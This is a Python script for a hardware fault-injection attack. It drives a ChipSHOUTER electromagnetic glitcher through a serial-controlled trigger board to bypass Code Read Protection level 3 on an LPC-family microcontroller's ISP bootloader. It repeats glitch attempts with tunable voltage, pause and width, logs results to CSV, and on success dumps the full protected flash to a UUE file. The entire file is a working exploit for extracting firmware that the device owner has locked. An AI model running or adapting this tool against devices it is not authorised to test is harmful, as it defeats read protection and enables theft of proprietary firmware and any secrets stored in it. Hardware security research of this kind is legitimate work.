#!/usr/bin/env python3
"""
Fast CRP3 ISP Read Glitch Attack

Optimized for speed - does setup once, then rapidly tests glitch attempts.
Captures flash dump on success.
"""

import serial
import time
import csv
import os
from datetime import datetime

SERIAL_PORT = '/dev/ttyACM0'
BAUD_RATE = 115200

def fast_cmd(ser, cmd, timeout=1.0, check=True):
    """Send command, wait for response, optionally check for errors"""
    ser.read(ser.in_waiting)
    ser.write(f"{cmd}\r\n".encode())
    time.sleep(0.03)

    response = ''
    start = time.time()
    while time.time() - start < timeout:
        if ser.in_waiting > 0:
            data = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
            response += data
            if '+' in response or '!' in response:
                # Give a bit more time for full response
                time.sleep(0.1)
                if ser.in_waiting > 0:
                    response += ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
                break
        time.sleep(0.01)

    if check and cmd.upper().startswith('CS'):
        # Print CS responses for debugging
        resp_clean = response.replace('\r', ' ').replace('\n', ' ').strip()
        # Check for actual errors - note VALUE ERROR in hwtrig_mode response is normal
        is_error = '!' in response or 'fault' in resp_clean.lower()
        if 'Command Not Found' in resp_clean:
            is_error = True
        # VALUE ERROR for hwtrig_mode is just ChipSHOUTER's quirky output, not a real error
        if is_error:
            print(f"  [CS ERROR] {cmd}: {resp_clean[:100]}", flush=True)
        else:
            print(f"  [CS] {cmd}: OK", flush=True)

    return response

def sync_target(ser):
    """Sync with target, return True if successful"""
    ser.write(b"API OFF\r\n")
    time.sleep(0.03)
    ser.read(ser.in_waiting)

    ser.write(b"TARGET SYNC 115200 12000 10 1\r\n")
    time.sleep(1.5)
    response = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')

    ser.write(b"API ON\r\n")
    time.sleep(0.03)
    ser.read(ser.in_waiting)

    return 'sync complete' in response.lower()

def sync_target_with_glitch(ser):
    """Sync with target, arming glitch BEFORE reset (for GPIO boot glitching).
    Returns True if sync successful."""
    # ARM the glitch FIRST - it will fire on GPIO RISING (reset release)
    fast_cmd(ser, "ARM ON", check=False)

    ser.write(b"API OFF\r\n")
    time.sleep(0.03)
    ser.read(ser.in_waiting)

    # This resets target, which triggers the glitch on reset release
    ser.write(b"TARGET SYNC 115200 12000 10 1\r\n")
    time.sleep(1.5)
    response = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')

    ser.write(b"API ON\r\n")
    time.sleep(0.03)
    ser.read(ser.in_waiting)

    return 'sync complete' in response.lower()

def get_cs_status(ser):
    """Query CS STATUS and return response"""
    ser.read(ser.in_waiting)
    ser.write(b"CS STATUS\r\n")
    time.sleep(0.5)  # CS STATUS takes ~0.4s to respond fully
    return ser.read(ser.in_waiting).decode('utf-8', errors='ignore').lower()

def ensure_cs_ready(ser, voltage):
    """Ensure CS is armed and ready. Reset if fault, re-arm if disarmed."""
    resp = get_cs_status(ser)

    # Check for fault state - must reset
    if 'fault' in resp:
        print(" [FAULT-RESET]", end='', flush=True)
        fast_cmd(ser, "CS RESET", check=False)
        time.sleep(1.0)
        # Wait for reset to complete (disarmed state)
        for _ in range(50):
            resp = get_cs_status(ser)
            if 'disarmed' in resp and 'fault' not in resp:
                break
            time.sleep(0.1)
        # Set voltage after reset
        fast_cmd(ser, f"CS VOLTAGE {voltage}", check=False)
        time.sleep(0.2)
        fast_cmd(ser, "CS TRIGGER HW HIGH", check=False)
        resp = get_cs_status(ser)

    # If disarmed, arm it
    if 'disarmed' in resp:
        fast_cmd(ser, "CS ARM", check=False)
        time.sleep(0.3)
        # Wait for armed state
        for _ in range(50):
            resp = get_cs_status(ser)
            if 'armed' in resp and 'disarmed' not in resp and 'fault' not in resp:
                break
            time.sleep(0.1)

    # Final verify
    resp = get_cs_status(ser)
    return 'armed' in resp and 'disarmed' not in resp and 'fault' not in resp

def test_crp_bypass(ser, test_only=False, no_save=False):
    """Check if CRP is bypassed (for GPIO boot glitch mode - glitch already fired).
    Returns result code."""
    # Don't arm - glitch already fired during boot

    # Send R command for flash - check if CRP was bypassed
    ser.write(b"API OFF\r\n")
    time.sleep(0.03)
    ser.read(ser.in_waiting)

    # Set fast timeout
    ser.write(b"TARGET TIMEOUT 10\r\n")
    time.sleep(0.05)
    ser.read(ser.in_waiting)

    # Read size: 4 bytes for test-only, full flash otherwise
    num_bytes = 4 if test_only else 516096
    ser.write(f'TARGET SEND "R 0 {num_bytes}"\r\n'.encode())

    def read_line():
        line = ser.read_until(b'\r').decode('utf-8', errors='ignore').strip()
        return line if line else None

    # Read echo lines
    read_line()  # firmware echo
    read_line()  # target echo
    error_line = read_line()

    if not error_line:
        ser.write(b"API ON\r\n")
        time.sleep(0.03)
        ser.read(ser.in_waiting)
        return 'CRASH'

    if error_line and len(error_line) > 0 and error_line[0] == '0':
        # SUCCESS! CRP bypassed
        ser.write(b"API ON\r\n")
        time.sleep(0.1)
        ser.read(ser.in_waiting)
        return 'SUCCESS'

    if error_line and '19' in error_line:
        ser.write(b"API ON\r\n")
        time.sleep(0.03)
        ser.read(ser.in_waiting)
        return 'CRP_BLOCKED'

    ser.write(b"API ON\r\n")
    time.sleep(0.03)
    ser.read(ser.in_waiting)
    return 'UNKNOWN'

def test_glitch(ser, output_file=None, voltage=200, test_only=False, no_save=False):
    """Run one glitch attempt with flash read, return result code"""
    # Ensure CS is armed and ready BEFORE each glitch (like glitch_heatmap.py)
    if not ensure_cs_ready(ser, voltage):
        print(" [CS NOT READY]", end='', flush=True)
        return 'CRASH'

    # ARM the Pico trigger
    fast_cmd(ser, "ARM ON", check=False)

    # Send R command for flash (glitch fires on \r echo)
    ser.write(b"API OFF\r\n")
    time.sleep(0.03)
    ser.read(ser.in_waiting)

    # Set fast timeout
    ser.write(b"TARGET TIMEOUT 10\r\n")
    time.sleep(0.05)
    ser.read(ser.in_waiting)

    # Read size: 4 bytes for test-only, full flash otherwise
    num_bytes = 4 if test_only else 516096
    ser.write(f'TARGET SEND "R 0 {num_bytes}"\r\n'.encode())

    def read_line():
        line = ser.read_until(b'\r').decode('utf-8', errors='ignore').strip()
        return line if line else None

    # Read echo lines
    read_line()  # firmware echo
    read_line()  # target echo
    error_line = read_line()

    if not error_line:
        ser.write(b"API ON\r\n")
        time.sleep(0.03)
        ser.read(ser.in_waiting)
        return 'CRASH'

    if error_line[0] == '0':
        # SUCCESS! CRP bypassed
        if test_only or no_save:
            # Just drain the response and return success - next reset will tidy up
            ser.write(b"API ON\r\n")
            time.sleep(0.1)
            ser.read(ser.in_waiting)
            return 'SUCCESS'

        # Full dump mode - read all the UUE data and save
        print("  Error code 0 - reading flash...", flush=True)

        full_bytes = 516096
        expected_lines = (full_bytes + 44) // 45
        uuencoded_lines = []
        lines_remaining = expected_lines
        first_chunk = True

        while lines_remaining > 0:
            chunk_size = min(20, lines_remaining)

            if not first_chunk:
                read_line()  # firmware echo
                read_line()  # prompt
                read_line()  # target echo "OK"
            first_chunk = False

            for i in range(chunk_size):
                line = read_line()
                if not line:
                    ser.write(b"API ON\r\n")
                    return 'READ_ERROR'
                uuencoded_lines.append(line)

            read_line()  # checksum
            lines_remaining -= chunk_size

            if len(uuencoded_lines) % 1000 == 0:
                print(f"    {len(uuencoded_lines)}/{expected_lines} lines", flush=True)

            if lines_remaining > 0:
                ser.write(b'TARGET SEND "OK"\r\n')

        read_line()  # end marker

        ser.write(b"API ON\r\n")
        time.sleep(0.03)
        ser.read(ser.in_waiting)

        # Save to UUE file
        if output_file:
            base_name = os.path.splitext(os.path.basename(output_file))[0]
            with open(output_file, 'w') as f:
                f.write(f"begin 644 {base_name}.bin\n")
                for line in uuencoded_lines:
                    f.write(line.replace('`', ' ') + '\n')
                f.write(" \n")
                f.write("end\n")
            print(f"  Flash saved to: {output_file}", flush=True)

        return 'SUCCESS'

    elif '19' in error_line:
        ser.write(b"API ON\r\n")
        time.sleep(0.03)
        ser.read(ser.in_waiting)
        return 'CRP_BLOCKED'

    else:
        ser.write(b"API ON\r\n")
        time.sleep(0.03)
        ser.read(ser.in_waiting)
        return 'CRASH'

def read_full_flash(ser, output_file):
    """Read full flash memory and save to UUE file"""
    print("Reading full flash memory...", flush=True)

    # ARM for the read
    fast_cmd(ser, "ARM ON")

    ser.write(b"API OFF\r\n")
    time.sleep(0.03)
    ser.read(ser.in_waiting)

    # Set fast timeout
    ser.write(b"TARGET TIMEOUT 10\r\n")
    time.sleep(0.1)
    ser.read(ser.in_waiting)

    # Send R command for full flash (504KB = 516096 bytes)
    address = 0
    num_bytes = 516096
    cmd = f"R {address} {num_bytes}"

    ser.write(f'TARGET SEND "{cmd}"\r\n'.encode())

    def read_line():
        while True:
            line = ser.read_until(b'\r').decode('utf-8', errors='ignore').strip()
            if line:
                return line
            if not ser.in_waiting:
                return None

    # Read echo lines
    read_line()  # firmware echo
    read_line()  # target echo
    error_line = read_line()

    if not error_line or error_line[0] != '0':
        print(f"  Flash read failed: error {error_line}", flush=True)
        ser.write(b"API ON\r\n")
        time.sleep(0.1)
        return False

    print(f"  Error code 0 - reading UUE data...", flush=True)

    # Read UUE data
    expected_lines = (num_bytes + 44) // 45
    uuencoded_lines = []
    lines_remaining = expected_lines
    first_chunk = True

    while lines_remaining > 0:
        chunk_size = min(20, lines_remaining)

        if not first_chunk:
            read_line()  # firmware echo
            read_line()  # prompt
            read_line()  # target echo "OK"
        first_chunk = False

        for i in range(chunk_size):
            line = read_line()
            if not line:
                print(f"  Timeout at line {len(uuencoded_lines) + i}", flush=True)
                ser.write(b"API ON\r\n")
                return False
            uuencoded_lines.append(line)

        # Read checksum
        checksum_line = read_line()

        lines_remaining -= chunk_size

        if len(uuencoded_lines) % 500 == 0:
            print(f"  Progress: {len(uuencoded_lines)}/{expected_lines} lines", flush=True)

        if lines_remaining > 0:
            ser.write(b'TARGET SEND "OK"\r\n')

    # Read end marker
    read_line()

    ser.write(b"API ON\r\n")
    time.sleep(0.1)
    ser.read(ser.in_waiting)

    # Save to UUE file
    base_name = os.path.splitext(os.path.basename(output_file))[0]
    with open(output_file, 'w') as f:
        f.write(f"begin 644 {base_name}.bin\n")
        for line in uuencoded_lines:
            f.write(line.replace('`', ' ') + '\n')
        f.write(" \n")
        f.write("end\n")

    print(f"  Flash saved to: {output_file}", flush=True)
    return True

def main():
    import argparse
    parser = argparse.ArgumentParser(description='Fast CRP3 ISP Glitch Attack')
    parser.add_argument('voltage', type=int, help='ChipSHOUTER voltage (150-500)')
    parser.add_argument('pause', type=int, help='Glitch pause in cycles @ 150MHz')
    parser.add_argument('width', type=int, help='Glitch width in cycles')
    parser.add_argument('iterations', type=int, help='Number of attempts')
    parser.add_argument('--test-only', action='store_true',
                       help='Quick test mode: read 4 bytes, no save, run all iterations')
    parser.add_argument('--trigger', choices=['uart', 'gpio', 'gpio-fall'], default='uart',
                       help='Trigger mode: uart (on READ cmd), gpio (on RESET rising), gpio-fall (on RESET falling)')
    parser.add_argument('--no-save', action='store_true',
                       help='Full read but no save, run all iterations')
    args = parser.parse_args()

    mode = "TEST-ONLY" if args.test_only else ("NO-SAVE" if args.no_save else "FULL DUMP")
    trig_modes = {'gpio': 'GPIO-RISING', 'gpio-fall': 'GPIO-FALLING', 'uart': 'UART'}
    trig_mode = trig_modes.get(args.trigger, 'UART')
    print(f"=== Fast CRP3 Glitch: {args.voltage}V, pause={args.pause}, width={args.width} ({mode}) ===")
    print(f"Iterations: {args.iterations}, Trigger: {trig_mode}")

    ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=1.0)
    time.sleep(0.3)

    # Initial setup (done once)
    print("\nSetting up...")
    ser.write(b"API ON\r\n")
    time.sleep(0.1)
    ser.read(ser.in_waiting)

    fast_cmd(ser, "RESET")
    time.sleep(0.3)
    ser.write(b"API ON\r\n")
    time.sleep(0.1)
    ser.read(ser.in_waiting)

    fast_cmd(ser, "TARGET LPC")

    # CS RESET - send and wait for not-fault state
    print("  [CS] CS RESET...", end='', flush=True)
    ser.read(ser.in_waiting)
    ser.write(b"CS RESET\r\n")
    time.sleep(0.1)
    ser.read(ser.in_waiting)
    for _ in range(100):
        resp = get_cs_status(ser)
        if 'fault' not in resp:
            break
        time.sleep(0.1)
    print(" OK", flush=True)

    # Set voltage
    print(f"  [CS] CS VOLTAGE {args.voltage}...", end='', flush=True)
    fast_cmd(ser, f"CS VOLTAGE {args.voltage}", check=False)
    time.sleep(0.3)
    print(" OK", flush=True)

    # Set HW trigger mode
    print("  [CS] CS TRIGGER HW HIGH...", end='', flush=True)
    fast_cmd(ser, "CS TRIGGER HW HIGH", check=False)
    time.sleep(0.2)
    print(" OK", flush=True)

    # Arm and wait for armed state
    print("  [CS] CS ARM...", end='', flush=True)
    fast_cmd(ser, "CS ARM", check=False)
    time.sleep(0.3)
    # Wait for armed state
    for _ in range(50):
        resp = get_cs_status(ser)
        if 'armed' in resp and 'disarmed' not in resp and 'fault' not in resp:
            break
        time.sleep(0.1)
    resp = get_cs_status(ser)
    if 'armed' not in resp or 'disarmed' in resp:
        print(f" FAILED: {resp[:50]}")
        ser.close()
        return
    print(" OK", flush=True)

    # Setup trigger (done once)
    fast_cmd(ser, f"SET PAUSE {args.pause}", check=False)
    fast_cmd(ser, f"SET WIDTH {args.width}", check=False)
    fast_cmd(ser, "SET COUNT 1", check=False)
    if args.trigger == 'gpio':
        fast_cmd(ser, "TRIGGER GPIO RISING", check=False)
    elif args.trigger == 'gpio-fall':
        fast_cmd(ser, "TRIGGER GPIO FALLING", check=False)
    else:
        fast_cmd(ser, "TRIGGER UART 0x0D", check=False)

    print("Setup complete", flush=True)

    # CSV log
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    csv_file = f"crp3_fast_V{args.voltage}_P{args.pause}_{timestamp}.csv"

    results = {'SUCCESS': 0, 'CRP_BLOCKED': 0, 'CRASH': 0, 'UNKNOWN': 0, 'SYNC_FAIL': 0}
    start_time = time.time()
    last_fault_check = start_time

    with open(csv_file, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['iteration', 'result', 'elapsed'])

        for i in range(args.iterations):
            # Periodic fault check (every 60 seconds)
            if time.time() - last_fault_check >= 60:
                resp = get_cs_status(ser)
                if 'fault' in resp:
                    print("\n  [Fault detected - clearing...]", end='', flush=True)
                    fast_cmd(ser, "CS CLEAR FAULTS", check=False)
                    time.sleep(0.5)
                    resp = get_cs_status(ser)
                    if 'fault' in resp:
                        print(" reset needed...", end='', flush=True)
                        ensure_cs_ready(ser, args.voltage)
                    else:
                        fast_cmd(ser, "CS ARM", check=False)
                    print(" OK")
                last_fault_check = time.time()

            # Sync target - GPIO mode arms before reset, UART mode after
            print(f"[{i+1}] ", end='', flush=True)

            if args.trigger in ('gpio', 'gpio-fall'):
                # GPIO mode: ensure CS armed, then sync with glitch armed (fires on reset)
                if not ensure_cs_ready(ser, args.voltage):
                    print("[CS NOT READY] CRASH", flush=True)
                    results['CRASH'] += 1
                    continue
                print("Glitch+Sync...", end='', flush=True)
                if not sync_target_with_glitch(ser):
                    print(" SYNC_FAIL", flush=True)
                    results['SYNC_FAIL'] += 1
                    continue
                print(" OK, checking...", end='', flush=True)
                # Check if CRP was bypassed (glitch already fired during boot)
                result = test_crp_bypass(ser, test_only=args.test_only, no_save=args.no_save)
            else:
                # UART mode: sync first, then glitch on READ command
                print("Syncing...", end='', flush=True)
                if not sync_target(ser):
                    print(" FAIL", flush=True)
                    results['SYNC_FAIL'] += 1
                    continue
                print(" OK, testing...", end='', flush=True)
                # Test glitch
                uue_file = None if (args.test_only or args.no_save) else f"crp3_flash_{timestamp}.uue"
                result = test_glitch(ser, output_file=uue_file, voltage=args.voltage,
                                   test_only=args.test_only, no_save=args.no_save)

            print(f" {result}", flush=True)
            results[result] = results.get(result, 0) + 1

            elapsed = time.time() - start_time
            writer.writerow([i+1, result, f"{elapsed:.2f}"])

            if (i+1) % 100 == 0:
                rate = (i+1) / elapsed
                print(f"[{i+1}] S={results.get('SUCCESS',0)} B={results.get('CRP_BLOCKED',0)} C={results.get('CRASH',0)} ({rate:.1f}/s)")

            if result == 'SUCCESS' and not args.test_only and not args.no_save:
                print(f"\n*** SUCCESS at attempt {i+1}! ***")
                break

    elapsed = time.time() - start_time
    total = sum(results.values())

    print(f"\n=== SUMMARY ({args.voltage}V) ===")
    print(f"Time: {elapsed:.1f}s ({total/elapsed:.2f} tests/s)")
    print(f"SUCCESS:     {results['SUCCESS']} ({results['SUCCESS']/total*100:.2f}%)")
    print(f"CRP_BLOCKED: {results['CRP_BLOCKED']} ({results['CRP_BLOCKED']/total*100:.2f}%)")
    print(f"CRASH:       {results['CRASH']} ({results['CRASH']/total*100:.2f}%)")
    print(f"Log: {csv_file}")

    ser.close()

if __name__ == "__main__":
    main()
